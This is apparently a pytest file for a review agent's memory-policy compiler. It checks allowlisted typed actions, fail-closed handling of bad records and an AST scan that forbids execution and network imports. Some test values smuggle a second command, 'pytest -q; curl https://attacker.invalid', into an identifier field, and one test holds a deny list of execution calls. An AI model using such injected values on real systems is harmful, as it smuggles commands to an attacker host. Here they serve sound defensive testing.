from __future__ import annotations

import ast
from dataclasses import FrozenInstanceError
from pathlib import Path

import pytest

from review_agent.memory_models import (
    DurableMemoryRecord,
    GitCommitSourceRef,
    MemoryConfidence,
    MemoryKind,
    MemoryScope,
    PolicyEffect,
    PolicyEffectKind,
    RecordStatus,
    Sensitivity,
    ValidityPolicy,
)
from review_agent.memory_policy import (
    PolicyDiagnosticCode,
    PolicyDiagnosticSeverity,
    PolicyDisposition,
    RaiseRiskFloorAction,
    RequireCheckAction,
    RequireContractAction,
    RuntimeActionKind,
    RuntimePolicyRegistry,
    TypedPolicyCompiler,
    VerificationHintAction,
    compile_memory_policy,
)
from review_agent.models import RiskLevel


REPOSITORY_KEY = "4" * 64
HEAD_SHA = "a" * 40
CREATED_AT = "2026-07-14T12:00:00Z"


def _effect(kind: PolicyEffectKind, value: str) -> PolicyEffect:
    return PolicyEffect(effect_kind=kind, value=value)


def _record(
    index: int,
    effect: PolicyEffect | None = None,
    *,
    status: RecordStatus = RecordStatus.ACTIVE,
    sensitivity: Sensitivity = Sensitivity.NORMAL,
) -> DurableMemoryRecord:
    return DurableMemoryRecord(
        candidate_id="MC-" + format(index, "064x"),
        repository_key=REPOSITORY_KEY,
        kind=MemoryKind.REVIEW_RULE,
        statement="Approved review rule %d." % index,
        scope=MemoryScope(),
        source_refs=(
            GitCommitSourceRef(
                commit_sha=HEAD_SHA,
                metadata_hash="1" * 64,
            ),
        ),
        source_bundle_hash="2" * 64,
        valid_from_sha=HEAD_SHA,
        validity_policies=(ValidityPolicy.MANUAL_UNTIL_REVOKED,),
        confidence=MemoryConfidence.HIGH,
        sensitivity=sensitivity,
        policy_effect=effect,
        approved_by="amy",
        approval_event_id="EVT-" + format(index + 1_000, "064x"),
        status=status,
        created_at=CREATED_AT,
    )


def _registry() -> RuntimePolicyRegistry:
    return RuntimePolicyRegistry(
        contract_ids=("numeric_correctness", "api_compat"),
        check_ids=("schema_check", "targeted_tests"),
        command_template_ids=("python_pytest_targeted", "python_schema_check"),
    )


def test_registry_is_an_immutable_validated_id_catalog() -> None:
    registry = RuntimePolicyRegistry(
        contract_ids=["z_contract", "a_contract", "z_contract"],
        check_ids={"z_check", "a_check"},
        command_template_ids=("z_template", "a_template"),
    )

    assert registry.contract_ids == ("a_contract", "z_contract")
    assert registry.check_ids == ("a_check", "z_check")
    assert registry.command_template_ids == ("a_template", "z_template")
    with pytest.raises(FrozenInstanceError):
        registry.contract_ids = ()
    with pytest.raises(ValueError, match="bounded policy identifier"):
        RuntimePolicyRegistry(command_template_ids=("pytest -q; curl evil",))
    with pytest.raises(ValueError, match="iterable"):
        RuntimePolicyRegistry(check_ids="targeted_tests")


def test_compiler_emits_only_typed_allowlisted_actions_and_informational_provenance() -> None:
    ordinary = _record(1)
    risk = _record(2, _effect(PolicyEffectKind.RISK_FLOOR, "high"))
    contract_left = _record(
        3,
        _effect(PolicyEffectKind.REQUIRE_CONTRACT, "numeric_correctness"),
    )
    contract_right = _record(
        4,
        _effect(PolicyEffectKind.REQUIRE_CONTRACT, "numeric_correctness"),
    )
    check = _record(
        5,
        _effect(PolicyEffectKind.REQUIRE_CHECK, "targeted_tests"),
    )
    hint = _record(
        6,
        _effect(PolicyEffectKind.VERIFICATION_HINT, "python_pytest_targeted"),
    )

    result = compile_memory_policy(
        (hint, ordinary, check, contract_right, risk, contract_left),
        current_risk_floor=RiskLevel.LOW,
        registry=_registry(),
    )

    assert result.blocked is False
    assert result.initial_risk_floor is RiskLevel.LOW
    assert result.effective_risk_floor is RiskLevel.HIGH
    assert result.diagnostics == ()
    assert tuple(type(item) for item in result.actions) == (
        RaiseRiskFloorAction,
        RequireContractAction,
        RequireCheckAction,
        VerificationHintAction,
    )
    assert result.actions[0] == RaiseRiskFloorAction(
        minimum_level=RiskLevel.HIGH,
        memory_ids=(risk.memory_id,),
    )
    assert result.actions[1] == RequireContractAction(
        contract_id="numeric_correctness",
        memory_ids=tuple(sorted((contract_left.memory_id, contract_right.memory_id))),
    )
    assert result.actions[2] == RequireCheckAction(
        check_id="targeted_tests",
        memory_ids=(check.memory_id,),
    )
    assert result.actions[3] == VerificationHintAction(
        command_template_id="python_pytest_targeted",
        memory_ids=(hint.memory_id,),
    )
    assert result.actions[3].to_dict() == {
        "type": "verification_hint",
        "command_template_id": "python_pytest_targeted",
        "memory_ids": [hint.memory_id],
    }

    provenance = {item.memory_id: item for item in result.provenance}
    assert provenance[ordinary.memory_id].disposition is PolicyDisposition.INFORMATIONAL
    assert provenance[ordinary.memory_id].effect_kind is None
    assert provenance[contract_left.memory_id].runtime_action_kind is (
        RuntimeActionKind.REQUIRE_CONTRACT
    )
    assert provenance[contract_right.memory_id].runtime_action_kind is (
        RuntimeActionKind.REQUIRE_CONTRACT
    )
    assert all(item.candidate_id is not None for item in result.provenance)
    assert all(item.approval_event_id is not None for item in result.provenance)

    with pytest.raises(FrozenInstanceError):
        result.actions[0].minimum_level = RiskLevel.CRITICAL
    with pytest.raises(FrozenInstanceError):
        result.provenance[0].memory_id = ordinary.memory_id


def test_risk_floor_can_only_strictly_raise_the_canonical_current_floor() -> None:
    lower = _record(10, _effect(PolicyEffectKind.RISK_FLOOR, "low"))
    equal = _record(11, _effect(PolicyEffectKind.RISK_FLOOR, "high"))

    result = TypedPolicyCompiler(_registry()).compile(
        (lower, equal),
        current_risk_floor=RiskLevel.HIGH,
    )

    assert result.actions == ()
    assert result.effective_risk_floor is RiskLevel.HIGH
    assert result.blocked is False
    assert {item.code for item in result.diagnostics} == {
        PolicyDiagnosticCode.RISK_FLOOR_NOT_RAISED
    }
    assert all(
        item.severity is PolicyDiagnosticSeverity.INFO
        for item in result.diagnostics
    )
    assert all(
        item.disposition is PolicyDisposition.NOT_APPLIED
        for item in result.provenance
    )
    with pytest.raises(ValueError, match="RiskLevel"):
        compile_memory_policy(
            (lower,),
            current_risk_floor="high",  # type: ignore[arg-type]
            registry=_registry(),
        )


@pytest.mark.parametrize(
    ("kind", "value", "code"),
    [
        (
            PolicyEffectKind.REQUIRE_CONTRACT,
            "not_registered",
            PolicyDiagnosticCode.UNKNOWN_CONTRACT,
        ),
        (
            PolicyEffectKind.REQUIRE_CHECK,
            "not_registered",
            PolicyDiagnosticCode.UNKNOWN_CHECK,
        ),
        (
            PolicyEffectKind.VERIFICATION_HINT,
            "not_registered",
            PolicyDiagnosticCode.UNKNOWN_COMMAND_TEMPLATE,
        ),
    ],
)
def test_unknown_registry_reference_is_blocking_and_emits_no_action(
    kind: PolicyEffectKind,
    value: str,
    code: PolicyDiagnosticCode,
) -> None:
    record = _record(20 + list(PolicyEffectKind).index(kind), _effect(kind, value))

    result = compile_memory_policy(
        (record,),
        current_risk_floor=RiskLevel.LOW,
        registry=_registry(),
    )

    assert result.blocked is True
    assert result.actions == ()
    assert tuple(item.code for item in result.diagnostics) == (code,)
    assert result.provenance[0].memory_id == record.memory_id
    assert result.provenance[0].disposition is PolicyDisposition.REJECTED
    assert result.provenance[0].diagnostic_codes == (code,)


def test_malicious_effect_parameter_and_unknown_kind_fail_closed() -> None:
    with pytest.raises(ValueError, match="bounded identifier"):
        _effect(
            PolicyEffectKind.VERIFICATION_HINT,
            "pytest -q; curl https://attacker.invalid",
        )

    malicious_effect = _effect(
        PolicyEffectKind.VERIFICATION_HINT,
        "python_pytest_targeted",
    )
    malicious_record = _record(30, malicious_effect)
    object.__setattr__(
        malicious_effect,
        "value",
        "pytest -q; curl https://attacker.invalid",
    )

    unknown_effect = _effect(PolicyEffectKind.REQUIRE_CHECK, "targeted_tests")
    unknown_record = _record(31, unknown_effect)
    object.__setattr__(unknown_effect, "effect_kind", "network_access")

    malicious_result = compile_memory_policy(
        (malicious_record,),
        current_risk_floor=RiskLevel.LOW,
        registry=_registry(),
    )
    unknown_result = compile_memory_policy(
        (unknown_record,),
        current_risk_floor=RiskLevel.LOW,
        registry=_registry(),
    )

    assert malicious_result.blocked is True
    assert malicious_result.actions == ()
    assert malicious_result.diagnostics[0].code is (
        PolicyDiagnosticCode.INVALID_POLICY_EFFECT
    )
    assert malicious_result.provenance[0].memory_id == malicious_record.memory_id
    assert malicious_result.provenance[0].effect_value is None

    assert unknown_result.blocked is True
    assert unknown_result.actions == ()
    assert unknown_result.diagnostics[0].code is (
        PolicyDiagnosticCode.UNKNOWN_POLICY_EFFECT
    )
    assert unknown_result.provenance[0].memory_id == unknown_record.memory_id


def test_inactive_blocked_or_untyped_records_cannot_compile_policy() -> None:
    inactive = _record(
        40,
        _effect(PolicyEffectKind.REQUIRE_CHECK, "targeted_tests"),
        status=RecordStatus.REVOKED,
    )
    blocked = _record(
        41,
        _effect(PolicyEffectKind.REQUIRE_CHECK, "targeted_tests"),
        sensitivity=Sensitivity.BLOCKED,
    )
    untyped = _record(
        42,
        _effect(PolicyEffectKind.REQUIRE_CHECK, "targeted_tests"),
    )
    object.__setattr__(untyped, "policy_effect", {"type": "require_check"})

    result = compile_memory_policy(
        (untyped, blocked, inactive),
        current_risk_floor=RiskLevel.LOW,
        registry=_registry(),
    )

    assert result.blocked is True
    assert result.actions == ()
    assert {item.code for item in result.diagnostics} == {
        PolicyDiagnosticCode.INACTIVE_RECORD,
        PolicyDiagnosticCode.BLOCKED_SENSITIVITY,
        PolicyDiagnosticCode.UNTYPED_POLICY_EFFECT,
    }
    assert {item.memory_id for item in result.provenance} == {
        inactive.memory_id,
        blocked.memory_id,
        untyped.memory_id,
    }
    assert all(
        item.disposition is PolicyDisposition.REJECTED
        for item in result.provenance
    )


def test_conflicting_records_with_the_same_memory_id_fail_closed_as_a_unit() -> None:
    contract = _record(
        50,
        _effect(PolicyEffectKind.REQUIRE_CONTRACT, "numeric_correctness"),
    )
    check = _record(
        50,
        _effect(PolicyEffectKind.REQUIRE_CHECK, "targeted_tests"),
    )
    assert contract.memory_id == check.memory_id

    result = compile_memory_policy(
        (contract, check),
        current_risk_floor=RiskLevel.LOW,
        registry=_registry(),
    )

    assert result.blocked is True
    assert result.actions == ()
    assert result.diagnostics[0].code is (
        PolicyDiagnosticCode.CONFLICTING_MEMORY_RECORD
    )
    assert len(result.provenance) == 1
    assert result.provenance[0].memory_id == contract.memory_id
    assert result.provenance[0].disposition is PolicyDisposition.REJECTED


def test_deduplication_and_all_output_ordering_are_input_order_independent() -> None:
    risk_medium = _record(60, _effect(PolicyEffectKind.RISK_FLOOR, "medium"))
    risk_critical = _record(61, _effect(PolicyEffectKind.RISK_FLOOR, "critical"))
    contract_left = _record(
        62,
        _effect(PolicyEffectKind.REQUIRE_CONTRACT, "api_compat"),
    )
    contract_right = _record(
        63,
        _effect(PolicyEffectKind.REQUIRE_CONTRACT, "api_compat"),
    )
    check = _record(64, _effect(PolicyEffectKind.REQUIRE_CHECK, "schema_check"))
    hint = _record(
        65,
        _effect(PolicyEffectKind.VERIFICATION_HINT, "python_schema_check"),
    )
    records = (
        hint,
        contract_right,
        risk_critical,
        contract_left,
        check,
        risk_medium,
        contract_left,
    )

    forward = compile_memory_policy(
        records,
        current_risk_floor=RiskLevel.LOW,
        registry=_registry(),
    )
    reverse = compile_memory_policy(
        tuple(reversed(records)),
        current_risk_floor=RiskLevel.LOW,
        registry=RuntimePolicyRegistry(
            contract_ids=tuple(reversed(_registry().contract_ids)),
            check_ids=tuple(reversed(_registry().check_ids)),
            command_template_ids=tuple(
                reversed(_registry().command_template_ids)
            ),
        ),
    )

    assert forward == reverse
    assert forward.to_dict() == reverse.to_dict()
    assert forward.effective_risk_floor is RiskLevel.CRITICAL
    assert tuple(item.kind for item in forward.actions) == (
        RuntimeActionKind.RAISE_RISK_FLOOR,
        RuntimeActionKind.RAISE_RISK_FLOOR,
        RuntimeActionKind.REQUIRE_CONTRACT,
        RuntimeActionKind.REQUIRE_CHECK,
        RuntimeActionKind.VERIFICATION_HINT,
    )
    contract_action = next(
        item for item in forward.actions if type(item) is RequireContractAction
    )
    assert contract_action.memory_ids == tuple(
        sorted((contract_left.memory_id, contract_right.memory_id))
    )
    assert len(forward.provenance) == len({item.memory_id for item in records})
    assert tuple(item.memory_id for item in forward.provenance) == tuple(
        sorted(item.memory_id for item in forward.provenance)
    )


def test_memory_policy_module_has_no_execution_or_expanding_authority_dependency() -> None:
    module = Path("src/review_agent/memory_policy.py")
    tree = ast.parse(module.read_text(encoding="utf-8"), filename=str(module))
    review_agent_imports = set()
    imported_roots = set()
    called_names = set()

    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            imported_roots.update(alias.name.split(".", 1)[0] for alias in node.names)
            review_agent_imports.update(
                alias.name
                for alias in node.names
                if alias.name.startswith("review_agent.")
            )
        elif isinstance(node, ast.ImportFrom) and node.module:
            imported_roots.add(node.module.split(".", 1)[0])
            if node.module.startswith("review_agent."):
                review_agent_imports.add(node.module)
        elif isinstance(node, ast.Call):
            if isinstance(node.func, ast.Name):
                called_names.add(node.func.id)
            elif isinstance(node.func, ast.Attribute):
                called_names.add(node.func.attr)

    assert review_agent_imports == {
        "review_agent.memory_models",
        "review_agent.models",
    }
    assert imported_roots.isdisjoint(
        {"subprocess", "os", "socket", "requests", "urllib", "pathlib"}
    )
    assert called_names.isdisjoint(
        {"open", "eval", "exec", "system", "popen", "Popen", "run", "call"}
    )
